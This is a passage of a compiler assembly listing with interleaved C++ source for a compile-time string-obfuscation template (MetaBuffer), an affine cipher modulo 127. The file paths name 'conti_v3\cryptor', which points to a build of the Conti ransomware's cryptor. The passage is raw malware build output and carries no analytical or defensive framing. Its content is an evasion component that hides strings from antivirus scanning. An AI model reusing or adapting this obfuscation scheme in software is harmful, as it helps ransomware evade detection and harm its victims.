; 40   :     return (a % n + n) % n;

  00034	41 f7 e8	 imul	 r8d
  00037	41 03 d0	 add	 edx, r8d
  0003a	c1 fa 06	 sar	 edx, 6
  0003d	8b c2		 mov	 eax, edx
  0003f	c1 e8 1f	 shr	 eax, 31
  00042	03 d0		 add	 edx, eax
  00044	6b c2 7f	 imul	 eax, edx, 127		; 0000007fH
  00047	44 2b c0	 sub	 r8d, eax
  0004a	b8 09 04 02 81	 mov	 eax, -2130574327	; ffffffff81020409H
  0004f	41 83 c0 7f	 add	 r8d, 127		; 0000007fH
  00053	41 f7 e8	 imul	 r8d
  00056	41 03 d0	 add	 edx, r8d
  00059	c1 fa 06	 sar	 edx, 6
  0005c	8b c2		 mov	 eax, edx
  0005e	c1 e8 1f	 shr	 eax, 31
  00061	03 d0		 add	 edx, eax
  00063	6b c2 7f	 imul	 eax, edx, 127		; 0000007fH
  00066	44 2b c0	 sub	 r8d, eax

; 66   :                 m_buffer[i] = decrypt(m_buffer[i]);

  00069	45 88 42 ff	 mov	 BYTE PTR [r10-1], r8b
  0006d	49 83 eb 01	 sub	 r11, 1
  00071	75 ad		 jne	 SHORT $LL4@decrypt
$LN17@decrypt:

; 67   :         }
; 68   : 
; 69   :         return (const char*)m_buffer;
; 70   :     }

  00073	49 8b c1	 mov	 rax, r9
  00076	c3		 ret	 0
?decrypt@?$MetaBuffer@$0GN@$0HF@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@@std@@@@QEAAPEBDXZ ENDP ; MetaBuffer<109,117,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13> >::decrypt
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ??0?$MetaBuffer@$0GN@$0HF@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@@std@@@@QEAA@PEBE@Z
_TEXT	SEGMENT
this$ = 8
data$dead$ = 16
??0?$MetaBuffer@$0GN@$0HF@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@@std@@@@QEAA@PEBE@Z PROC ; MetaBuffer<109,117,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13> >::MetaBuffer<109,117,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13> >, COMDAT

; 55   : 
; 56   :     inline bool isDecrypted() const
; 57   :     {
; 58   :         return m_isDecrypted;
; 59   :     }
; 60   : 
; 61   :     inline const char* decrypt()
; 62   :     {
; 63   :         if (!isDecrypted())
; 64   :         {
; 65   :             for (size_t i = 0; i < sizeof...(Ints); ++i)
; 66   :                 m_buffer[i] = decrypt(m_buffer[i]);
; 67   :         }
; 68   : 
; 69   :         return (const char*)m_buffer;
; 70   :     }
; 71   : 
; 72   : private:
; 73   :     constexpr unsigned char __forceinline encrypt(unsigned char byte) const
; 74   :     {
; 75   :         return (A * byte + B) % 127;
; 76   :     }
; 77   : 
; 78   :     constexpr unsigned char __forceinline decrypt(unsigned char byte) const
; 79   :     {
; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);
; 81   :     }
; 82   : 
; 83   :     volatile bool m_isDecrypted = false;

  00000	c6 01 00	 mov	 BYTE PTR [rcx], 0
  00003	c6 41 01 33	 mov	 BYTE PTR [rcx+1], 51	; 00000033H
  00007	c6 41 02 75	 mov	 BYTE PTR [rcx+2], 117	; 00000075H
  0000b	c6 41 03 60	 mov	 BYTE PTR [rcx+3], 96	; 00000060H
  0000f	c6 41 04 75	 mov	 BYTE PTR [rcx+4], 117	; 00000075H
  00013	c6 41 05 4d	 mov	 BYTE PTR [rcx+5], 77	; 0000004dH
  00017	c6 41 06 75	 mov	 BYTE PTR [rcx+6], 117	; 00000075H
  0001b	c6 41 07 74	 mov	 BYTE PTR [rcx+7], 116	; 00000074H
  0001f	c6 41 08 75	 mov	 BYTE PTR [rcx+8], 117	; 00000075H
  00023	c6 41 09 05	 mov	 BYTE PTR [rcx+9], 5
  00027	c6 41 0a 75	 mov	 BYTE PTR [rcx+10], 117	; 00000075H
  0002b	c6 41 0b 71	 mov	 BYTE PTR [rcx+11], 113	; 00000071H
  0002f	c6 41 0c 75	 mov	 BYTE PTR [rcx+12], 117	; 00000075H
  00033	c6 41 0d 75	 mov	 BYTE PTR [rcx+13], 117	; 00000075H
  00037	c6 41 0e 75	 mov	 BYTE PTR [rcx+14], 117	; 00000075H
  0003b	0f b6 41 01	 movzx	 eax, BYTE PTR [rcx+1]
  0003f	48 8b c1	 mov	 rax, rcx
  00042	c3		 ret	 0
??0?$MetaBuffer@$0GN@$0HF@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@@std@@@@QEAA@PEBE@Z ENDP ; MetaBuffer<109,117,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13> >::MetaBuffer<109,117,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13> >
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ?decrypt@?$MetaBuffer@$0EP@$0EC@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@@std@@@@QEAAPEBDXZ
_TEXT	SEGMENT
this$ = 8
?decrypt@?$MetaBuffer@$0EP@$0EC@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@@std@@@@QEAAPEBDXZ PROC ; MetaBuffer<79,66,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11> >::decrypt, COMDAT

; 58   :         return m_isDecrypted;

  00000	0f b6 01	 movzx	 eax, BYTE PTR [rcx]
  00003	4c 8d 41 01	 lea	 r8, QWORD PTR [rcx+1]

; 63   :         if (!isDecrypted())

  00007	84 c0		 test	 al, al
  00009	75 64		 jne	 SHORT $LN17@decrypt

; 64   :         {
; 65   :             for (size_t i = 0; i < sizeof...(Ints); ++i)

  0000b	4d 8b c8	 mov	 r9, r8
  0000e	41 ba 0c 00 00
	00		 mov	 r10d, 12
  00014	0f 1f 40 00 0f
	1f 84 00 00 00
	00 00		 npad	 12
$LL4@decrypt:

; 66   :                 m_buffer[i] = decrypt(m_buffer[i]);

  00020	41 0f b6 09	 movzx	 ecx, BYTE PTR [r9]
  00024	4d 8d 49 01	 lea	 r9, QWORD PTR [r9+1]

; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);

  00028	b8 42 00 00 00	 mov	 eax, 66			; 00000042H
  0002d	2b c1		 sub	 eax, ecx
  0002f	6b c8 2d	 imul	 ecx, eax, 45		; 0000002dH

; 40   :     return (a % n + n) % n;

  00032	b8 09 04 02 81	 mov	 eax, -2130574327	; ffffffff81020409H
  00037	f7 e9		 imul	 ecx
  00039	03 d1		 add	 edx, ecx
  0003b	c1 fa 06	 sar	 edx, 6
  0003e	8b c2		 mov	 eax, edx
  00040	c1 e8 1f	 shr	 eax, 31
  00043	03 d0		 add	 edx, eax
  00045	6b c2 7f	 imul	 eax, edx, 127		; 0000007fH
  00048	2b c8		 sub	 ecx, eax
  0004a	b8 09 04 02 81	 mov	 eax, -2130574327	; ffffffff81020409H
  0004f	83 c1 7f	 add	 ecx, 127		; 0000007fH
  00052	f7 e9		 imul	 ecx
  00054	03 d1		 add	 edx, ecx
  00056	c1 fa 06	 sar	 edx, 6
  00059	8b c2		 mov	 eax, edx
  0005b	c1 e8 1f	 shr	 eax, 31
  0005e	03 d0		 add	 edx, eax
  00060	6b c2 7f	 imul	 eax, edx, 127		; 0000007fH
  00063	2b c8		 sub	 ecx, eax

; 66   :                 m_buffer[i] = decrypt(m_buffer[i]);

  00065	41 88 49 ff	 mov	 BYTE PTR [r9-1], cl
  00069	49 83 ea 01	 sub	 r10, 1
  0006d	75 b1		 jne	 SHORT $LL4@decrypt
$LN17@decrypt:

; 67   :         }
; 68   : 
; 69   :         return (const char*)m_buffer;
; 70   :     }

  0006f	49 8b c0	 mov	 rax, r8
  00072	c3		 ret	 0
?decrypt@?$MetaBuffer@$0EP@$0EC@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@@std@@@@QEAAPEBDXZ ENDP ; MetaBuffer<79,66,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11> >::decrypt
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ??0?$MetaBuffer@$0EP@$0EC@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@@std@@@@QEAA@PEBE@Z
_TEXT	SEGMENT
this$ = 8
data$dead$ = 16
??0?$MetaBuffer@$0EP@$0EC@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@@std@@@@QEAA@PEBE@Z PROC ; MetaBuffer<79,66,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11> >::MetaBuffer<79,66,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11> >, COMDAT

; 55   : 
; 56   :     inline bool isDecrypted() const
; 57   :     {
; 58   :         return m_isDecrypted;
; 59   :     }
; 60   : 
; 61   :     inline const char* decrypt()
; 62   :     {
; 63   :         if (!isDecrypted())
; 64   :         {
; 65   :             for (size_t i = 0; i < sizeof...(Ints); ++i)
; 66   :                 m_buffer[i] = decrypt(m_buffer[i]);
; 67   :         }
; 68   : 
; 69   :         return (const char*)m_buffer;
; 70   :     }
; 71   : 
; 72   : private:
; 73   :     constexpr unsigned char __forceinline encrypt(unsigned char byte) const
; 74   :     {
; 75   :         return (A * byte + B) % 127;
; 76   :     }
; 77   : 
; 78   :     constexpr unsigned char __forceinline decrypt(unsigned char byte) const
; 79   :     {
; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);
; 81   :     }
; 82   : 
; 83   :     volatile bool m_isDecrypted = false;

  00000	c6 01 00	 mov	 BYTE PTR [rcx], 0
  00003	c6 41 01 11	 mov	 BYTE PTR [rcx+1], 17
  00007	c6 41 02 42	 mov	 BYTE PTR [rcx+2], 66	; 00000042H
  0000b	c6 41 03 0a	 mov	 BYTE PTR [rcx+3], 10
  0000f	c6 41 04 42	 mov	 BYTE PTR [rcx+4], 66	; 00000042H
  00013	c6 41 05 2c	 mov	 BYTE PTR [rcx+5], 44	; 0000002cH
  00017	c6 41 06 42	 mov	 BYTE PTR [rcx+6], 66	; 00000042H
  0001b	c6 41 07 15	 mov	 BYTE PTR [rcx+7], 21
  0001f	c6 41 08 42	 mov	 BYTE PTR [rcx+8], 66	; 00000042H
  00023	c6 41 09 6a	 mov	 BYTE PTR [rcx+9], 106	; 0000006aH
  00027	c6 41 0a 42	 mov	 BYTE PTR [rcx+10], 66	; 00000042H
  0002b	c6 41 0b 42	 mov	 BYTE PTR [rcx+11], 66	; 00000042H
  0002f	c6 41 0c 42	 mov	 BYTE PTR [rcx+12], 66	; 00000042H
  00033	0f b6 41 01	 movzx	 eax, BYTE PTR [rcx+1]
  00037	48 8b c1	 mov	 rax, rcx
  0003a	c3		 ret	 0
??0?$MetaBuffer@$0EP@$0EC@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@@std@@@@QEAA@PEBE@Z ENDP ; MetaBuffer<79,66,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11> >::MetaBuffer<79,66,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11> >
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ?decrypt@?$MetaBuffer@$0CJ@$00U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEAAPEBDXZ
_TEXT	SEGMENT
this$ = 8
?decrypt@?$MetaBuffer@$0CJ@$00U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEAAPEBDXZ PROC ; MetaBuffer<41,1,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::decrypt, COMDAT

; 58   :         return m_isDecrypted;

  00000	0f b6 01	 movzx	 eax, BYTE PTR [rcx]

; 63   :         if (!isDecrypted())

  00003	84 c0		 test	 al, al
  00005	75 5e		 jne	 SHORT $LN17@decrypt

; 64   :         {
; 65   :             for (size_t i = 0; i < sizeof...(Ints); ++i)

  00007	4c 8d 51 01	 lea	 r10, QWORD PTR [rcx+1]
  0000b	41 bb 0a 00 00
	00		 mov	 r11d, 10
$LL4@decrypt:

; 66   :                 m_buffer[i] = decrypt(m_buffer[i]);

  00011	41 0f b6 02	 movzx	 eax, BYTE PTR [r10]
  00015	4d 8d 52 01	 lea	 r10, QWORD PTR [r10+1]
  00019	44 6b c0 1f	 imul	 r8d, eax, 31

; 40   :     return (a % n + n) % n;

  0001d	b8 09 04 02 81	 mov	 eax, -2130574327	; ffffffff81020409H

; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);

  00022	41 83 e8 1f	 sub	 r8d, 31

; 40   :     return (a % n + n) % n;

  00026	41 f7 e8	 imul	 r8d
  00029	41 03 d0	 add	 edx, r8d
  0002c	c1 fa 06	 sar	 edx, 6
  0002f	8b c2		 mov	 eax, edx
  00031	c1 e8 1f	 shr	 eax, 31
  00034	03 d0		 add	 edx, eax
  00036	6b c2 7f	 imul	 eax, edx, 127		; 0000007fH
  00039	44 2b c0	 sub	 r8d, eax
  0003c	b8 09 04 02 81	 mov	 eax, -2130574327	; ffffffff81020409H
  00041	41 83 c0 7f	 add	 r8d, 127		; 0000007fH
  00045	41 f7 e8	 imul	 r8d
  00048	41 03 d0	 add	 edx, r8d
  0004b	c1 fa 06	 sar	 edx, 6
  0004e	8b c2		 mov	 eax, edx
  00050	c1 e8 1f	 shr	 eax, 31
  00053	03 d0		 add	 edx, eax
  00055	6b c2 7f	 imul	 eax, edx, 127		; 0000007fH
  00058	44 2b c0	 sub	 r8d, eax

; 66   :                 m_buffer[i] = decrypt(m_buffer[i]);

  0005b	45 88 42 ff	 mov	 BYTE PTR [r10-1], r8b
  0005f	49 83 eb 01	 sub	 r11, 1
  00063	75 ac		 jne	 SHORT $LL4@decrypt
$LN17@decrypt:

; 67   :         }
; 68   : 
; 69   :         return (const char*)m_buffer;
; 70   :     }

  00065	48 8d 41 01	 lea	 rax, QWORD PTR [rcx+1]
  00069	c3		 ret	 0
?decrypt@?$MetaBuffer@$0CJ@$00U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEAAPEBDXZ ENDP ; MetaBuffer<41,1,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::decrypt
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ??0?$MetaBuffer@$0CJ@$00U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEAA@PEBE@Z
_TEXT	SEGMENT
this$ = 8
data$dead$ = 16
??0?$MetaBuffer@$0CJ@$00U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEAA@PEBE@Z PROC ; MetaBuffer<41,1,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::MetaBuffer<41,1,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >, COMDAT

; 55   : 
; 56   :     inline bool isDecrypted() const
; 57   :     {
; 58   :         return m_isDecrypted;
; 59   :     }
; 60   : 
; 61   :     inline const char* decrypt()
; 62   :     {
; 63   :         if (!isDecrypted())
; 64   :         {
; 65   :             for (size_t i = 0; i < sizeof...(Ints); ++i)
; 66   :                 m_buffer[i] = decrypt(m_buffer[i]);
; 67   :         }
; 68   : 
; 69   :         return (const char*)m_buffer;
; 70   :     }
; 71   : 
; 72   : private:
; 73   :     constexpr unsigned char __forceinline encrypt(unsigned char byte) const
; 74   :     {
; 75   :         return (A * byte + B) % 127;
; 76   :     }
; 77   : 
; 78   :     constexpr unsigned char __forceinline decrypt(unsigned char byte) const
; 79   :     {
; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);
; 81   :     }
; 82   : 
; 83   :     volatile bool m_isDecrypted = false;

  00000	c6 01 00	 mov	 BYTE PTR [rcx], 0
  00003	c6 41 01 6d	 mov	 BYTE PTR [rcx+1], 109	; 0000006dH
  00007	c6 41 02 01	 mov	 BYTE PTR [rcx+2], 1
  0000b	c6 41 03 46	 mov	 BYTE PTR [rcx+3], 70	; 00000046H
  0000f	c6 41 04 01	 mov	 BYTE PTR [rcx+4], 1
  00013	c6 41 05 25	 mov	 BYTE PTR [rcx+5], 37	; 00000025H
  00017	c6 41 06 01	 mov	 BYTE PTR [rcx+6], 1
  0001b	c6 41 07 52	 mov	 BYTE PTR [rcx+7], 82	; 00000052H
  0001f	c6 41 08 01	 mov	 BYTE PTR [rcx+8], 1
  00023	c6 41 09 01	 mov	 BYTE PTR [rcx+9], 1
  00027	c6 41 0a 01	 mov	 BYTE PTR [rcx+10], 1
  0002b	0f b6 41 01	 movzx	 eax, BYTE PTR [rcx+1]
  0002f	48 8b c1	 mov	 rax, rcx
  00032	c3		 ret	 0
??0?$MetaBuffer@$0CJ@$00U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEAA@PEBE@Z ENDP ; MetaBuffer<41,1,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::MetaBuffer<41,1,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ?decrypt@?$MetaBuffer@$0GF@$05U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEAAPEBDXZ
_TEXT	SEGMENT
this$ = 8
?decrypt@?$MetaBuffer@$0GF@$05U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEAAPEBDXZ PROC ; MetaBuffer<101,6,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::decrypt, COMDAT

; 58   :         return m_isDecrypted;

  00000	0f b6 01	 movzx	 eax, BYTE PTR [rcx]
  00003	4c 8d 41 01	 lea	 r8, QWORD PTR [rcx+1]

; 63   :         if (!isDecrypted())

  00007	84 c0		 test	 al, al
  00009	75 64		 jne	 SHORT $LN17@decrypt

; 64   :         {
; 65   :             for (size_t i = 0; i < sizeof...(Ints); ++i)

  0000b	4d 8b c8	 mov	 r9, r8
  0000e	41 ba 0a 00 00
	00		 mov	 r10d, 10
  00014	0f 1f 40 00 0f
	1f 84 00 00 00
	00 00		 npad	 12
$LL4@decrypt:

; 66   :                 m_buffer[i] = decrypt(m_buffer[i]);

  00020	41 0f b6 09	 movzx	 ecx, BYTE PTR [r9]
  00024	4d 8d 49 01	 lea	 r9, QWORD PTR [r9+1]

; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);

  00028	b8 06 00 00 00	 mov	 eax, 6
  0002d	2b c1		 sub	 eax, ecx
  0002f	6b c8 2c	 imul	 ecx, eax, 44		; 0000002cH

; 40   :     return (a % n + n) % n;

  00032	b8 09 04 02 81	 mov	 eax, -2130574327	; ffffffff81020409H
  00037	f7 e9		 imul	 ecx
  00039	03 d1		 add	 edx, ecx
  0003b	c1 fa 06	 sar	 edx, 6
  0003e	8b c2		 mov	 eax, edx
  00040	c1 e8 1f	 shr	 eax, 31
  00043	03 d0		 add	 edx, eax
  00045	6b c2 7f	 imul	 eax, edx, 127		; 0000007fH
  00048	2b c8		 sub	 ecx, eax
  0004a	b8 09 04 02 81	 mov	 eax, -2130574327	; ffffffff81020409H
  0004f	83 c1 7f	 add	 ecx, 127		; 0000007fH
  00052	f7 e9		 imul	 ecx
  00054	03 d1		 add	 edx, ecx
  00056	c1 fa 06	 sar	 edx, 6
  00059	8b c2		 mov	 eax, edx
  0005b	c1 e8 1f	 shr	 eax, 31
  0005e	03 d0		 add	 edx, eax
  00060	6b c2 7f	 imul	 eax, edx, 127		; 0000007fH
  00063	2b c8		 sub	 ecx, eax

; 66   :                 m_buffer[i] = decrypt(m_buffer[i]);

  00065	41 88 49 ff	 mov	 BYTE PTR [r9-1], cl
  00069	49 83 ea 01	 sub	 r10, 1
  0006d	75 b1		 jne	 SHORT $LL4@decrypt
$LN17@decrypt:

; 67   :         }
; 68   : 
; 69   :         return (const char*)m_buffer;
; 70   :     }

  0006f	49 8b c0	 mov	 rax, r8
  00072	c3		 ret	 0
?decrypt@?$MetaBuffer@$0GF@$05U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEAAPEBDXZ ENDP ; MetaBuffer<101,6,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::decrypt
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ??0?$MetaBuffer@$0GF@$05U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEAA@PEBE@Z
_TEXT	SEGMENT
this$ = 8
data$dead$ = 16
??0?$MetaBuffer@$0GF@$05U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEAA@PEBE@Z PROC ; MetaBuffer<101,6,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::MetaBuffer<101,6,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >, COMDAT

; 55   : 
; 56   :     inline bool isDecrypted() const
; 57   :     {
; 58   :         return m_isDecrypted;
; 59   :     }
; 60   : 
; 61   :     inline const char* decrypt()
; 62   :     {
; 63   :         if (!isDecrypted())
; 64   :         {
; 65   :             for (size_t i = 0; i < sizeof...(Ints); ++i)
; 66   :                 m_buffer[i] = decrypt(m_buffer[i]);
; 67   :         }
; 68   : 
; 69   :         return (const char*)m_buffer;
; 70   :     }
; 71   : 
; 72   : private:
; 73   :     constexpr unsigned char __forceinline encrypt(unsigned char byte) const
; 74   :     {
; 75   :         return (A * byte + B) % 127;
; 76   :     }
; 77   : 
; 78   :     constexpr unsigned char __forceinline decrypt(unsigned char byte) const
; 79   :     {
; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);
; 81   :     }
; 82   : 
; 83   :     volatile bool m_isDecrypted = false;

  00000	c6 01 00	 mov	 BYTE PTR [rcx], 0
  00003	c6 41 01 50	 mov	 BYTE PTR [rcx+1], 80	; 00000050H
  00007	c6 41 02 06	 mov	 BYTE PTR [rcx+2], 6
  0000b	c6 41 03 2c	 mov	 BYTE PTR [rcx+3], 44	; 0000002cH
  0000f	c6 41 04 06	 mov	 BYTE PTR [rcx+4], 6
  00013	c6 41 05 26	 mov	 BYTE PTR [rcx+5], 38	; 00000026H
  00017	c6 41 06 06	 mov	 BYTE PTR [rcx+6], 6
  0001b	c6 41 07 3d	 mov	 BYTE PTR [rcx+7], 61	; 0000003dH
  0001f	c6 41 08 06	 mov	 BYTE PTR [rcx+8], 6
  00023	c6 41 09 06	 mov	 BYTE PTR [rcx+9], 6
  00027	c6 41 0a 06	 mov	 BYTE PTR [rcx+10], 6
  0002b	0f b6 41 01	 movzx	 eax, BYTE PTR [rcx+1]
  0002f	48 8b c1	 mov	 rax, rcx
  00032	c3		 ret	 0
??0?$MetaBuffer@$0GF@$05U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEAA@PEBE@Z ENDP ; MetaBuffer<101,6,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::MetaBuffer<101,6,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ?decrypt@?$MetaBuffer@$0BB@$0CH@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEAAPEBDXZ
_TEXT	SEGMENT
this$ = 8
?decrypt@?$MetaBuffer@$0BB@$0CH@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEAAPEBDXZ PROC ; MetaBuffer<17,39,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::decrypt, COMDAT

; 58   :         return m_isDecrypted;

  00000	0f b6 01	 movzx	 eax, BYTE PTR [rcx]
  00003	4c 8d 49 01	 lea	 r9, QWORD PTR [rcx+1]

; 63   :         if (!isDecrypted())

  00007	84 c0		 test	 al, al
  00009	75 68		 jne	 SHORT $LN17@decrypt

; 64   :         {
; 65   :             for (size_t i = 0; i < sizeof...(Ints); ++i)

  0000b	4d 8b d1	 mov	 r10, r9
  0000e	41 bb 0a 00 00
	00		 mov	 r11d, 10
  00014	0f 1f 40 00 0f
	1f 84 00 00 00
	00 00		 npad	 12
$LL4@decrypt:

; 66   :                 m_buffer[i] = decrypt(m_buffer[i]);

  00020	41 0f b6 0a	 movzx	 ecx, BYTE PTR [r10]
  00024	4d 8d 52 01	 lea	 r10, QWORD PTR [r10+1]

; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);

  00028	83 e9 27	 sub	 ecx, 39			; 00000027H

; 40   :     return (a % n + n) % n;

  0002b	b8 09 04 02 81	 mov	 eax, -2130574327	; ffffffff81020409H

; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);

  00030	44 6b c1 0f	 imul	 r8d, ecx, 15

; 40   :     return (a % n + n) % n;

  00034	41 f7 e8	 imul	 r8d
  00037	41 03 d0	 add	 edx, r8d
  0003a	c1 fa 06	 sar	 edx, 6
  0003d	8b c2		 mov	 eax, edx
  0003f	c1 e8 1f	 shr	 eax, 31
  00042	03 d0		 add	 edx, eax
  00044	6b c2 7f	 imul	 eax, edx, 127		; 0000007fH
  00047	44 2b c0	 sub	 r8d, eax
  0004a	b8 09 04 02 81	 mov	 eax, -2130574327	; ffffffff81020409H
  0004f	41 83 c0 7f	 add	 r8d, 127		; 0000007fH
  00053	41 f7 e8	 imul	 r8d
  00056	41 03 d0	 add	 edx, r8d
  00059	c1 fa 06	 sar	 edx, 6
  0005c	8b c2		 mov	 eax, edx
  0005e	c1 e8 1f	 shr	 eax, 31
  00061	03 d0		 add	 edx, eax
  00063	6b c2 7f	 imul	 eax, edx, 127		; 0000007fH
  00066	44 2b c0	 sub	 r8d, eax

; 66   :                 m_buffer[i] = decrypt(m_buffer[i]);

  00069	45 88 42 ff	 mov	 BYTE PTR [r10-1], r8b
  0006d	49 83 eb 01	 sub	 r11, 1
  00071	75 ad		 jne	 SHORT $LL4@decrypt
$LN17@decrypt:

; 67   :         }
; 68   : 
; 69   :         return (const char*)m_buffer;
; 70   :     }

  00073	49 8b c1	 mov	 rax, r9
  00076	c3		 ret	 0
?decrypt@?$MetaBuffer@$0BB@$0CH@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEAAPEBDXZ ENDP ; MetaBuffer<17,39,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::decrypt
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ??0?$MetaBuffer@$0BB@$0CH@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEAA@PEBE@Z
_TEXT	SEGMENT
this$ = 8
data$dead$ = 16
??0?$MetaBuffer@$0BB@$0CH@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEAA@PEBE@Z PROC ; MetaBuffer<17,39,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::MetaBuffer<17,39,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >, COMDAT

; 55   : 
; 56   :     inline bool isDecrypted() const
; 57   :     {
; 58   :         return m_isDecrypted;
; 59   :     }
; 60   : 
; 61   :     inline const char* decrypt()
; 62   :     {
; 63   :         if (!isDecrypted())
; 64   :         {
; 65   :             for (size_t i = 0; i < sizeof...(Ints); ++i)
; 66   :                 m_buffer[i] = decrypt(m_buffer[i]);
; 67   :         }
; 68   : 
; 69   :         return (const char*)m_buffer;
; 70   :     }
; 71   : 
; 72   : private:
; 73   :     constexpr unsigned char __forceinline encrypt(unsigned char byte) const
; 74   :     {
; 75   :         return (A * byte + B) % 127;
; 76   :     }
; 77   : 
; 78   :     constexpr unsigned char __forceinline decrypt(unsigned char byte) const
; 79   :     {
; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);
; 81   :     }
; 82   : 
; 83   :     volatile bool m_isDecrypted = false;

  00000	c6 01 00	 mov	 BYTE PTR [rcx], 0
  00003	c6 41 01 3b	 mov	 BYTE PTR [rcx+1], 59	; 0000003bH
  00007	c6 41 02 27	 mov	 BYTE PTR [rcx+2], 39	; 00000027H
  0000b	c6 41 03 3f	 mov	 BYTE PTR [rcx+3], 63	; 0000003fH
  0000f	c6 41 04 27	 mov	 BYTE PTR [rcx+4], 39	; 00000027H
